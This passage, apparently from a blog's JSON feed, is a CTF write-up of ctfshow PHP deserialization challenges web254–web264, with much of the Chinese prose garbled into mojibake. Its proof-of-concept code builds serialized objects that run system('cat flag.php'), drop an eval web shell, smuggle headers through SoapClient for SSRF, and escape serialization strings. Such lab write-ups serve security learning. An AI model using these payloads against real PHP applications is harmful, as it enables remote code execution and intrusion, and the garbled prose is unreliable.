","permalink":"https://tari.moe/tags/ctf%E7%BB%83%E4%B9%A0/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://tari.moe/tags/ctfshow/"}]},{"title":"ctfshow ååºåˆ—åŒ–ç¯‡","slug":"ctfshow-unserialize","date":"2021-04-06T12:21:40.000Z","updated":"2021-04-25T14:00:44.611Z","comments":true,"path":"2021/04/06/ctfshow-unserialize/","link":"","permalink":"https://tari.moe/2021/04/06/ctfshow-unserialize/","excerpt":"","text":"æ„Ÿè§‰æ’åºä¸æ˜¯å¾ˆå‹å¥½..å› ä¸ºéš¾åº¦ä¸æ˜¯ç›¸å¯¹é€’å¢çš„ å»ºè®®é¡ºåº web254-258ã€web260ã€web262-web266ã€web259ã€web261ã€web275-276 ç„¶å web277-278 æ˜¯ Python ååºåˆ—åŒ–ï¼Œä¸è¿‡æ¯”è¾ƒç®€å• æœ€åæ˜¯ web267-web274 éƒ½æ˜¯æ¡†æ¶çš„ååºåˆ—åŒ–æ¼æ´ï¼Œåˆ†æèµ·æ¥ä¼šéº»çƒ¦äº› web267-270 æ˜¯ Yii çš„ CVE å’Œ ç»•è¿‡ï¼Œweb271-273 æ˜¯ Laravel 5.7 å’Œ 5.8 çš„ååºåˆ—åŒ–ï¼Œ web274æ˜¯ thinkphp5.1 çš„ååºåˆ—åŒ– æ¡†æ¶çš„ååºåˆ—åŒ–æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç°ï¼Œ23333 web254 PHPç±»ç®€å•è®¤è¯†123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-02 17:44:47# @Last Modified by: h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123; public $username=&#x27;xxxxxx&#x27;; public $password=&#x27;xxxxxx&#x27;; public $isVip=false; public function checkVip()&#123; return $this-&gt;isVip; &#125; public function login($u,$p)&#123; if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p)&#123; $this-&gt;isVip=true; &#125; return $this-&gt;isVip; &#125; public function vipOneKeyGetFlag()&#123; if($this-&gt;isVip)&#123; global $flag; echo &quot;your flag is &quot;.$flag; &#125;else&#123; echo &quot;no vip, no flag&quot;; &#125; &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123; $user = new ctfShowUser(); if($user-&gt;login($username,$password))&#123; if($user-&gt;checkVip())&#123; $user-&gt;vipOneKeyGetFlag(); &#125; &#125;else&#123; echo &quot;no vip,no flag&quot;; &#125;&#125; poc 1GET /?username=xxxxxx&amp;password=xxxxxx web255 ç®€å•é€»è¾‘nginx/1.16.1 PHP/7.3.11 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-02 17:44:47# @Last Modified by: h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123; public $username=&#x27;xxxxxx&#x27;; public $password=&#x27;xxxxxx&#x27;; public $isVip=false; public function checkVip()&#123; return $this-&gt;isVip; &#125; public function login($u,$p)&#123; return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; &#125; public function vipOneKeyGetFlag()&#123; if($this-&gt;isVip)&#123; global $flag; echo &quot;your flag is &quot;.$flag; &#125;else&#123; echo &quot;no vip, no flag&quot;; &#125; &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123; $user = unserialize($_COOKIE[&#x27;user&#x27;]); if($user-&gt;login($username,$password))&#123; if($user-&gt;checkVip())&#123; $user-&gt;vipOneKeyGetFlag(); &#125; &#125;else&#123; echo &quot;no vip,no flag&quot;; &#125;&#125; åˆ†æï¼š å³è¦æ»¡è¶³ ç±»æˆå‘˜ isVip ä¸º true ä¼ å…¥çš„ username å’Œ ç±»æˆå‘˜ username ç›¸ç­‰ ä¼ å…¥çš„ password å’Œ ç±»æˆå‘˜ password ç›¸ç­‰ username å’Œ password å·²çŸ¥ï¼Œååºåˆ—åŒ–ä¿®æ”¹ isVip å³å¯ poc 123456&lt;?phpclass ctfShowUser&#123;&#125;$user = new ctfShowUser();$user-&gt;isVip = true;echo urlencode(serialize($user));?&gt; web256 ç®€å•é€»è¾‘nginx/1.16.1 PHP/7.3.11 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-02 17:44:47# @Last Modified by: h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123; public $username=&#x27;xxxxxx&#x27;; public $password=&#x27;xxxxxx&#x27;; public $isVip=false; public function checkVip()&#123; return $this-&gt;isVip; &#125; public function login($u,$p)&#123; return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; &#125; public function vipOneKeyGetFlag()&#123; if($this-&gt;isVip)&#123; global $flag; if($this-&gt;username!==$this-&gt;password)&#123; echo &quot;your flag is &quot;.$flag; &#125; &#125;else&#123; echo &quot;no vip, no flag&quot;; &#125; &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123; $user = unserialize($_COOKIE[&#x27;user&#x27;]); if($user-&gt;login($username,$password))&#123; if($user-&gt;checkVip())&#123; $user-&gt;vipOneKeyGetFlag(); &#125; &#125;else&#123; echo &quot;no vip,no flag&quot;; &#125;&#125; åˆ†æï¼š å³è¦æ»¡è¶³ ç±»æˆå‘˜ isVip ä¸º true ä¼ å…¥çš„ username å’Œ ç±»æˆå‘˜ username ç›¸ç­‰ ä¼ å…¥çš„ password å’Œ ç±»æˆå‘˜ password ç›¸ç­‰ ç±»çš„ username å’Œ password ä¸ç­‰ï¼ˆåŸæ¥æ˜¯ç›¸ç­‰çš„ï¼‰ å› ä¸ºé€šè¿‡ååºåˆ—åŒ–ä¿®æ”¹åŸæœ‰æ•°æ®å³å¯ poc 123456&lt;?php$user = new ctfShowUser();$user-&gt;isVip = true;$user-&gt;username = &#x27;6&#x27;;echo urlencode(serialize($user));?&gt; web257 ç®€å•POPé“¾nginx/1.16.1 PHP/7.3.11 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-02 17:44:47# @Last Modified by: h1xa# @Last Modified time: 2020-12-02 20:33:07# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123; private $username=&#x27;xxxxxx&#x27;; private $password=&#x27;xxxxxx&#x27;; private $isVip=false; private $class = &#x27;info&#x27;; public function __construct()&#123; $this-&gt;class=new info(); &#125; public function login($u,$p)&#123; return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; &#125; public function __destruct()&#123; $this-&gt;class-&gt;getInfo(); &#125;&#125;class info&#123; private $user=&#x27;xxxxxx&#x27;; public function getInfo()&#123; return $this-&gt;user; &#125;&#125;class backDoor&#123; private $code; public function getInfo()&#123; eval($this-&gt;code); &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123; $user = unserialize($_COOKIE[&#x27;user&#x27;]); $user-&gt;login($username,$password);&#125; åˆ†æï¼š è§¦å‘ backDoor å³å¯ poc 1234567891011121314&lt;?phpclass ctfShowUser&#123; public function __construct()&#123; $this-&gt;class=new backDoor(); &#125;&#125;class backDoor&#123; private $code = &#x27;system(&quot;cat ./flag.php&quot;);&#x27;;&#125;$user = new ctfShowUser();echo(urlencode(serialize($user)));?&gt; web258 æ­£åˆ™PHP/5.6.40 æ­£åˆ™ç»•è¿‡ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-02 17:44:47# @Last Modified by: h1xa# @Last Modified time: 2020-12-02 21:38:56# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123; public $username=&#x27;xxxxxx&#x27;; public $password=&#x27;xxxxxx&#x27;; public $isVip=false; public $class = &#x27;info&#x27;; public function __construct()&#123; $this-&gt;class=new info(); &#125; public function login($u,$p)&#123; return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; &#125; public function __destruct()&#123; $this-&gt;class-&gt;getInfo(); &#125;&#125;class info&#123; public $user=&#x27;xxxxxx&#x27;; public function getInfo()&#123; return $this-&gt;user; &#125;&#125;class backDoor&#123; public $code; public function getInfo()&#123; eval($this-&gt;code); &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123; if(!preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123; $user = unserialize($_COOKIE[&#x27;user&#x27;]); &#125; $user-&gt;login($username,$password);&#125; åˆ†æï¼š ç»•è¿‡æ­£åˆ™ /[oc]:\\d+:/i , å…¶å®å°±æ˜¯ C:æ•°å­— æˆ– O:æ•°å­— ä¸è¿ç»­ï¼Œè¿™é‡Œåªéœ€è®© O:11 ä¸è¿ç»­å³å¯ï¼Œæ¯”å¦‚ O:+11 poc 123456789101112131415&lt;?phpclass ctfShowUser&#123; public function __construct()&#123; $this-&gt;class=new backDoor(); &#125;&#125;class backDoor&#123; public $code = &#x27;system(&quot;cat flag.php&quot;);&#x27;;&#125;$user = new ctfShowUser();$user_replace = preg_replace(&#x27;/([oc]\\:)(\\d+)/i&#x27;, &#x27;$1+$2&#x27;, serialize($user));echo urlencode($user_replace);?&gt; å›¾ä¸­ %2b ä¸º + çš„ urlç¼–ç  web259 SSRF + CRLF + SoapClientPHP/7.3.11 SSRF CRLF SoapClient index.php 12345678&lt;?phphighlight_file(__FILE__);$vip = unserialize($_GET[&#x27;vip&#x27;]);//vip can get flag one key$vip-&gt;getFlag(); flag.php (å¤§æ¦‚å¦‚ä¸‹ 1234567891011121314&lt;?php$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);array_pop($xff);$ip = array_pop($xff);if($ip!==&#x27;127.0.0.1&#x27;)&#123; die(&#x27;error&#x27;);&#125;else&#123; $token = $_POST[&#x27;token&#x27;]; if($token==&#x27;ctfshow&#x27;)&#123; file_put_contents(&#x27;flag.txt&#x27;,$flag); &#125;&#125; åˆ†æï¼š ä¸å°± XFFä¼ªé€ ï¼Ÿ ä¼°è®¡ç»™çš„ä»£ç æ˜¯ä¸å®Œæ•´çš„ï¼Œè¿˜çœŸå® IP åˆ¤æ–­ï¼Œä¼°è®¡å¤§æ¦‚æ˜¯è¿™æ ·çš„ 12345678910111213141516171819&lt;?php$flag = &quot;flag_tari&quot;;$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);array_pop($xff);$ip = array_pop($xff);if($_SERVER[&#x27;REMOTE_ADDR&#x27;]===&#x27;127.0.0.1&#x27;)&#123; if($ip!==&#x27;127.0.0.1&#x27;)&#123; die(&#x27;error&#x27;); &#125;else&#123; $token = $_POST[&#x27;token&#x27;]; if($token==&#x27;ctfshow&#x27;)&#123; file_put_contents(&#x27;flag.txt&#x27;,$flag); &#125; &#125;&#125;echo &quot;your ip not 127.0.0.1&quot;; æœäº†ä¸€æ³¢ï¼Œå¥‡æ€ªçš„çŸ¥è¯†å¢åŠ äº†ï¼Œé™¤äº†XFFï¼Œæœ¬é¢˜è¿˜ç”¨åˆ° SSRF(SoapClient)+CRLFç»„åˆæ‹³ï¼Œæ¯•ç«Ÿæˆ‘ä»¬çš„ index.php è¿˜æœ‰ç”¨åˆ°å‘¢ éœ€è¦åˆ©ç”¨ SSRF è®¿é—® flag.php å¹¶æ„é€  XFF å’Œ POST æ•°æ®ï¼ŒSSRFæ¼æ´åœ¨å“ªå‘¢ï¼Ÿ SoapClientç±» __call é­”æœ¯æ–¹æ³• __call() é­”æœ¯æ–¹æ³•ï¼šå½“è°ƒç”¨ä¸€ä¸ªç±»ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶å€™ä¼šè§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³• å½“è°ƒç”¨ SoapClient ç±»çš„ __call() é­”æœ¯æ–¹æ³•çš„æ—¶å€™ï¼Œä¼šå‘é€ä¸€ä¸ª POST è¯·æ±‚ï¼Œè¯·æ±‚çš„å‚æ•°ç”±ç€ SoapClient ç±»çš„ä¸€äº›å‚æ•°å†³å®šã€‚ å› æ­¤ï¼Œå½“æˆ‘ä»¬è¿è¡Œ index.php çš„ $vip-&gt;getFlag(); æ–¹æ³•æ—¶ï¼Œä¼šå›  SoapClient ä¸å­˜åœ¨ getFlag æ–¹æ³•è€Œè°ƒç”¨ __call() é­”æœ¯æ–¹æ³•ï¼Œè¿›è€Œå‘é€ä¸€ä¸ª POST è¯·æ±‚ poc 1234567891011121314151617&lt;?php$post_string = &#x27;token=ctfshow&#x27;;$soap = new SoapClient( null, array( &#x27;uri&#x27;=&gt; &quot;http://127.0.0.1/flag.php&quot;, &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php&#x27;, &#x27;user_agent&#x27;=&gt;&quot;edge\\r\\nX-Forwarded-For:127.0.0.1,127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded&quot;.&quot;\\r\\nContent-Length: &quot;.(string)strlen($post_string).&quot;\\r\\n\\r\\n&quot;.$post_string, // &#x27;user_agent&#x27;=&gt;&quot;edge\\x0D\\x0AX-Forwarded-For:127.0.0.1,127.0.0.1\\x0D\\x0AContent-Type: application/x-www-form-urlencoded&quot;.&quot;\\x0D\\x0AContent-Length: &quot;.(string)strlen($post_string).&quot;\\x0D\\x0A\\x0D\\x0A&quot;.$post_string, ));echo(urlencode(serialize($soap)));?&gt; è¿™é‡Œæ³¨æ„ä¸‹ï¼ŒåŒ…å«ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰çš„ï¼Œæ¯”å¦‚ \\r\\n è¦ç”¨åŒå¼•å· &quot; å•å¼•å·ä¿æŒåŸæ¥çš„è¯­ä¹‰çš„ã€‚ warning æ²¡å…³ç³» web260 ç®€å•æ­£åˆ™PHP/5.6.40 123456789&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);if(preg_match(&#x27;/ctfshow_i_love_36D/&#x27;,serialize($_GET[&#x27;ctfshow&#x27;])))&#123; echo $flag;&#125; poc 12345678910&lt;?phpclass ctfShowUser&#123; public $tari = &#x27;ctfshow_i_love_36D&#x27;;&#125;$user = new ctfShowUser();echo(urlencode(serialize($user)));?&gt; (åŸ) web261 SSRF RedisPHP/7.3.11 index.php 12345678&lt;?phphighlight_file(__FILE__);$vip = unserialize($_GET[&#x27;vip&#x27;]);//vip can get flag one key$vip-&gt;getFlag(); åˆ†æï¼š é¢˜ç›®æç¤ºï¼šæ‰“ Redisï¼Œé»˜è®¤ç«¯å£ä¸º 6379 åŸæ¥çš„ web261ï¼Œä¸çŸ¥ä¸ºå•¥æ¢æˆäº†ä¸‹é¢è¿™ä¸ªã€‚ åŸæœ¬çš„è§£é¢˜æ€è·¯å¤§æ¦‚æ˜¯åœ¨ web259 çš„åŸºç¡€ä¸Šï¼Œæ„é€  POSTåŒ…å»æ‰“ redis web261 PHPç‰¹æ€§nginx/1.18.0 PHP/7.4.16 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phphighlight_file(__FILE__);class ctfshowvip&#123; public $username; public $password; public $code; public function __construct($u,$p)&#123; $this-&gt;username=$u; $this-&gt;password=$p; &#125; public function __wakeup()&#123; if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123; die(&#x27;error&#x27;); &#125; &#125; public function __invoke()&#123; eval($this-&gt;code); &#125; public function __sleep()&#123; $this-&gt;username=&#x27;&#x27;; $this-&gt;password=&#x27;&#x27;; &#125; public function __unserialize($data)&#123; $this-&gt;username=$data[&#x27;username&#x27;]; $this-&gt;password=$data[&#x27;password&#x27;]; $this-&gt;code = $this-&gt;username.$this-&gt;password; &#125; public function __destruct()&#123; if($this-&gt;code==0x36d)&#123; file_put_contents($this-&gt;username, $this-&gt;password); &#125; &#125;&#125;unserialize($_GET[&#x27;vip&#x27;]); åˆ†æ __wakeup() unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚ å› è¿™é‡Œå†™ç€ username å’Œ password å¿…é¡»ä¸ºéç©ºï¼Œå¦åˆ™ä¼šé€€å‡ºï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘è¦ç»•è¿‡è¿™é‡Œ å‚è€ƒ CVE-2016-7124 å½±å“èŒƒå›´ PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10 æ¼æ´åŸç† å½“ååºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ï¼Œè¡¨ç¤ºå±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šç»•è¿‡ __wakeup å‡½æ•°çš„æ‰§è¡Œã€‚ ä½†æ˜¯é¢˜ç›®æ˜¯ PHP 7.4.2 æ˜æ˜¾ä¸æ»¡è¶³è¦æ±‚ï¼Œ ç„¶åguguruäº†ä¸€ä¸‹æ¯”è¾ƒæ˜¾çœ¼çš„ __unserialize é­”æœ¯æ–¹æ³•ï¼Œå› ä¸ºæ²¡è§è¿‡ https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize å‘ç°æœ‰è¶£çš„ä¸œè¥¿ï¼Œå®˜æ–¹æ–‡æ¡£æ˜¯è¿™æ ·ä»‹ç»çš„ å°±å½“åŒæ—¶å­˜åœ¨ __wakeup å’Œ __unserialize é­”æœ¯æ–¹æ³•æ—¶ï¼Œåªä¼šè°ƒç”¨ __unserialize é­”æœ¯æ–¹æ³•ã€‚ ä»”ç»†è§‚å¯Ÿææ„æ–¹æ³•ï¼Œæ˜¯ä¸ªå¼±æ¯”è¾ƒ $this-&gt;code==0x36d ç„¶å 0x36d çš„åè¿›åˆ¶æ˜¯ 877 ï¼Œå†™ä¸ªå°å®éªŒ ä¹Ÿå°±æ˜¯è¯´å¼±æ¯”è¾ƒ $code å˜é‡å‰é¢æ˜¯ 877 å°±å¥½äº†ï¼Œä¸ç®¡åé¢åŠ äº†å•¥å­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥è®© $code == 0x36d æˆç«‹äº†ã€‚ æ„é€  POC 1234567&lt;?phpclass ctfshowvip&#123; public $username = &quot;877.php&quot;; public $password = &#x27;&lt;?php eval($_GET[c]); ?&gt;&#x27;;&#125;echo urlencode(serialize(new ctfshowvip())); ä¼šç”Ÿæˆ 877.php ç„¶å cat /flag_is_here å³å¯ é¢˜å¤– å› ä¸º PHP åº•å±‚æ˜¯ç”¨ Cè¯­è¨€å†™çš„ï¼ŒåŸæœ¬æƒ³ç€ç”¨ \\0 ä½œä¸ºå­—ç¬¦ä¸²æˆªæ–­ï¼Œè¿™æ ·ä¸ä¼šæ‹¼æ¥ $passwod å­—æ®µï¼Œç„¶åå‘ç°ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå‚æ•°æœ‰ \\0 ï¼Œ file_put_contents ä¼šæŠ¥é”™ã€‚ ç„¶å __invoke å’Œ __sleep åœ¨è¿™é‡Œçš„ç”¨å¤„ä¸å¤ªæ¸…æ¥šã€‚ã€‚ web262 å­—ç¬¦é€ƒé€¸PHP/5.6.40 å­—ç¬¦é€ƒé€¸ index.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 02:37:19# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 16:05:38# @message.php# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;$f = $_GET[&#x27;f&#x27;];$m = $_GET[&#x27;m&#x27;];$t = $_GET[&#x27;t&#x27;];if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123; $msg = new message($f,$m,$t); $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg)); setcookie(&#x27;msg&#x27;,base64_encode($umsg)); echo &#x27;Your message has been sent&#x27;;&#125;highlight_file(__FILE__); çœ‹æ³¨é‡Šå‘ç° message.php 123456789101112131415161718192021222324252627282930313233&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 15:13:03# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123; $msg = unserialize(base64_decode($_COOKIE[&#x27;msg&#x27;])); if($msg-&gt;token==&#x27;admin&#x27;)&#123; echo $flag; &#125;&#125; ç¬¬ä¸€ç§åšæ³•poc 1234567891011&lt;?phpclass message&#123; public $token=&#x27;admin&#x27;;&#125;$msg = new message();echo(base64_encode(serialize($msg)));?&gt; ç¬¬äºŒç§åšæ³•å› æœ‰ä¸€ä¸ªæ­£åˆ™æ›¿æ¢ï¼Œæ³¨æ„æ˜¯åºåˆ—åŒ–åå†æ›¿æ¢ï¼Œä¸”æ›¿æ¢æ¯æ¬¡å†…å®¹é•¿åº¦å¢åŠ 1ï¼Œå‡å¦‚è¾“å…¥ t=fuck&quot; æˆ‘ä»¬è¾“å…¥çš„ &quot; åˆšåˆšå¥½å¯ä»¥å‘å‰é¢é—­åˆï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æ¯è¾“å…¥ä¸€ä¸ª fuckï¼Œæˆ‘ä»¬å¯æ§çš„å†…å®¹å°±å¤šå‡º 1 ä¸ªå­—ç¬¦ã€‚ æˆ‘ä»¬ç›®çš„æ„é€  $token=&quot;admin&quot; åºåˆ—åŒ–é•¿è¿™æ · å³ s:5:&quot;token&quot;;s:5:&quot;admin&quot;; åŠ ä¸Šé—­åˆ 1&quot;;&#96;&#96;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#96;&#96;&#125; é•¿åº¦ä¸º 27 ä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦è¾“å…¥ 27 ä¸ª fuck poc 1/?f=6&amp;m=6&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125; web263 sessionä¼ªé€ PHP/7.3.11 sessionä¼ªé€  ğŸ“www.zip é€šè¿‡ /www.zip æ‰«æåˆ°æºç ï¼Œè¿™é‡Œç›®å½•æ‰«æå…¨æ˜¯ 200ï¼Œå»ºè®®ä½¿ç”¨å¯ä»¥çœ‹åˆ°è¿”å›åŒ…å¤§å°çš„æ‰«æå™¨ï¼Œæˆ–è€…æœ‰ 404 é¡µé¢è¯†åˆ«çš„æ‰«æå™¨ï¼Œæ¯”å¦‚ dirmap æ—¥å¸¸åæ§½ fortifyï¼Œå’‹å•¥ä¹Ÿæ‰«ä¸å‡ºæ¥ (x seay å‘ç° file_put_contents è¾“å…¥å¯æ§ åˆ©ç”¨å‰æï¼š åˆ©ç”¨ç‚¹æ˜¯ session.serialize_handler ä¸ php.ini çš„é…ç½®ä¸åŒå¼•èµ·çš„ååºåˆ—åŒ–ï¼Œè‡³äºä¸ºä»€ä¹ˆä¸åŒï¼Œå¦‚æœç›¸åŒçš„ä¹Ÿå°±æ²¡å¿…è¦åŠ ä¸Šè¿™å¥è®¾ç½®äº†ï¼ˆini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);ï¼‰ï¼Œæ¯•ç«Ÿæ˜¯é»˜è®¤é…ç½®å¯¹å§ ç›®æ ‡ï¼š file_put_contents å¯æ§ç‚¹åœ¨ inc/inc.php åœ¨ User ç±»ï¼Œå¯ä»¥é€šè¿‡ååºåˆ—åŒ–è§¦å‘ __destruct æ€è·¯ï¼š é¦–å…ˆè®¿é—®ä¸¤æ¬¡é¦–é¡µï¼ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ°Cookie limit å‚æ•°ï¼Œæ„é€  exp ï¼Œä½¿å¾—æˆ‘ä»¬çš„ååºåˆ—åŒ–æ•°æ®å†™å…¥ session æ–‡ä»¶ï¼ˆé€šè¿‡ $_SESSION[&#39;limit&#39;]=base64_decode($_COOKIE[&#39;limit&#39;]); å†™å…¥ï¼Œè¿™æ˜¯PHP session æœºåˆ¶ï¼Œå¯å‚è€ƒ æ­¤é“¾æ¥ï¼‰ å›  inc/inc.php å­˜åœ¨ ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); å’Œ session_start(); ï¼Œåªè¦è®¿é—®å³ä¼šè·å–ä¹‹å‰å†™å…¥çš„ session æ•°æ®ï¼Œç„¶å check.php åŒ…å« inc/inc.php ï¼Œå³ä¼šè§¦å‘ Userç±» çš„ __destructæ–¹æ³• ï¼Œä»è€ŒæŠŠæ¶æ„æ•°æ®é€šè¿‡ file_put_contents å†™å…¥åä¸º log-$this.username ï¼Œå†…å®¹ä¸º $this.password çš„æ–‡ä»¶ã€‚ poc 123456789101112&lt;?phpclass User&#123; public $username = &#x27;tari.php&#x27;; public $password = &#x27;&lt;?php system(&quot;cat flag.php&quot;) ?&gt;&#x27;;&#125;$user = new User();echo(base64_encode(&#x27;|&#x27;.serialize($user)));?&gt; è¿™é‡ŒåŠ  &#39;|&#39; æ˜¯å› ä¸º session.serialize_handler ä½¿ç”¨ phpå¼•æ“ ï¼Œsession å…³è”æ•°ç»„çš„ key å’Œ value æ˜¯é€šè¿‡ &#39;|&#39; åŒºåˆ†çš„ï¼Œ value æ˜¯éœ€è¦è¢«ååºåˆ—åŒ–çš„éƒ¨åˆ†ã€‚ç„¶åé»˜è®¤ä¸æ˜¯ç”¨ php å¼•æ“ï¼Œæ‰€ä»¥â€¦. æ‰€ä»¥å†™å…¥æ˜¯æ­£å¸¸å­—ç¬¦ä¸²ï¼Œåœ¨ inc/inc.php è¿™è¯»å–è¯­ä¹‰åˆä¸ä¸€æ ·äº†ã€‚ éšä¾¿è¯·æ±‚ä¸€ä¸‹ check.php æ³¨æ„æ˜¯ log-tari.php ! web264 å­—ç¬¦é€ƒé€¸PHP/5.6.40 å­—ç¬¦é€ƒé€¸ 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 02:37:19# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 16:05:38# @message.php# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);session_start();class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;$f = $_GET[&#x27;f&#x27;];$m = $_GET[&#x27;m&#x27;];$t = $_GET[&#x27;t&#x27;];if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123; $msg = new message($f,$m,$t); $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg)); $_SESSION[&#x27;msg&#x27;]=base64_encode($umsg); echo &#x27;Your message has been sent&#x27;;&#125;highlight_file(__FILE__); çœ‹æ³¨é‡Šå‘ç° message.php 12345678910111213141516171819202122232425262728293031323334&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 15:13:03# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/session_start();highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123; $msg = unserialize(base64_decode($_SESSION[&#x27;msg&#x27;])); if($msg-&gt;token==&#x27;admin&#x27;)&#123; echo $flag; &#125;&#125; çœ‹æ³¨é‡Šå‘ç° message.php 12345678910111213141516171819202122232425262728293031323334&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 15:13:03# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: 